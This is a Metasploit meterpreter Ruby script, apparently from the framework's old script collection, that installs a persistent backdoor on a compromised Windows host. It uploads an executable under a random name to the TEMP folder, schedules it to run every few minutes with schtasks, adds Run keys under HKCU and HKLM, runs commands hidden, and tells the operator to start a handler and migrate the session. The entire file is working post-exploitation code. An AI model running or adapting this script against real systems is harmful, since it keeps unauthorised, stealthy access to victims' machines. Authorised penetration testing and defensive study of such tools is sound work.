##
# WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
# If you'd like to imporve this script, please try to port it as a post
# module instead. Thank you.
##



# Author/Contributors: 
# Ben Turner
# Carlos Perez at carlos_perez[at]darkoperator.com
#-------------------------------------------------------------------------------
################## Variable Declarations ##################

# Meterpreter Session
@client = client

# Default parameters for payload
name = "update-svc-msf"
delay = 5
unin = false
ext = ".exe"
cusexe = ""

@exec_opts = Rex::Parser::Arguments.new(
  "-h"  => [ true,  "This help menu"],
  "-x"  => [ true,   "The path to the Custom EXE or BAT file to use for persistence, e.g. -x /root/msf.exe"],
  "-c"  => [ true,   "The extension of the Custom EXE, e.g. -c bat"],
  "-d"  => [ true,   "The delay on the scheduled task in minutes"],
  "-n"  => [ true,   "The name of the task and registry key on the host"],
  "-u"  => [ true,   "The interval in seconds between each connection attempt"]
)
meter_type = client.platform

################## Function Declarations ##################

  # Usage Message Function
  #-------------------------------------------------------------------------------
  def usage
    print_line "Meterpreter script to create a persistent backdoor on a target host."
    print_line(@exec_opts.usage)
    raise Rex::Script::Completed
  end

  ##
  # uploads the payload to the host with the correct extension
  ##

  def write_to_target(payloadsource)
    tempdir = @client.sys.config.getenv('TEMP')
    ext = payloadsource[payloadsource.rindex(".") .. -1]
    tempfile = tempdir + "\\" + Rex::Text.rand_text_alpha((rand(8)+6)) + "." + ext
    begin
      session.fs.file.upload_file(tempfile, payloadsource)
      print_good("Persistent Script written to #{tempfile}")
      tempfile = tempfile.gsub(/\\/, '\\')      # Escape windows pathname separators.
    rescue
      print_error("Could not write the payload on the target hosts.")
      # return nil since we could not write the file on the target host.
      tempfile = nil
    end
    return tempfile
  end
  ##
  # The write registry function
  ##

  def write_to_reg(key, script_on_target, registry_value)
    nam = registry_value
    key_path = "#{key.to_s}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    if key && registry_setvaldata(key_path, nam, script_on_target, "REG_SZ")
      print_good("Installed key into autorun: #{key_path}\\#{nam}")
      return true
    else
      print_error("Failed to make entry in the registry for persistence: #{key_path}\\#{nam}")
    end
    false
  end

  ##
  # The delete registry function
  ##

  def delete_reg(key, registry_value)
    nam = registry_value
    key_path = "#{key.to_s}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    print_status("Removing key from autorun: #{key_path}\\#{nam}")
    if key && registry_deletekey(key_path, nam)
      print_good("Removed key from autorun: #{key_path}\\#{nam}")
      return true
    else
      print_error("Failed to remove entry in the registry: #{key_path}\\#{nam}")
    end
    false
  end

  ##
  # The api shellexecute function
  ##

  def run_cmd(cmd)
    process = session.sys.process.execute(cmd, nil, {'Hidden' => true, 'Channelized' => true})
    res = ""
    while (d = process.channel.read)
      break if d == ""
      res << d
    end
    process.channel.close
    process.close
    return res
  end


################## Main ##################
@exec_opts.parse(args) { |opt, idx, val|
  case opt
  when "-h"
    usage
  when "-x"
    cusexe = val.to_s
  when "-n"
    name = val.to_s
  when "-u"
    unin = true
  when "-d"
    delay = val.to_i
  end
}

    print_status("Running module against " + @client.session_host)
    print("\n")

    # If the uninstall flag is set, remove the persistence
    if unin == true
      print_status("Removing scheduled task from " + @client.session_host)
      run_cmd("schtasks /delete /f /tn #{name}")
      delete_reg("HKCU", name)
      delete_reg("HKLM", name)

    else
      # uploads the payload to the host
      script_on_target = write_to_target(cusexe)

      # exit the module because we failed to write the file on the target host.
      return unless script_on_target

      # install new scheduled tasks (removes any previously installed tasks first) 
      run_cmd("schtasks /delete /f /tn #{name}")
      run_cmd("schtasks /create /sc minute /mo #{delay} /tn #{name} /tr #{script_on_target}")
      print_good("Installed scheduled (" + name + ") task on " + @client.session_host)

      # attempts to write the registry values to the system
      write_to_reg("HKCU", script_on_target, name)
      write_to_reg("HKLM", script_on_target, name)
      print("\n")
      print_status("Create your multi handler, your persistence will not re-run if you do not migrate the session and kill the original process, use 'migrate -f -k'")
      print_status("To remove persistence add the -u option")
    end
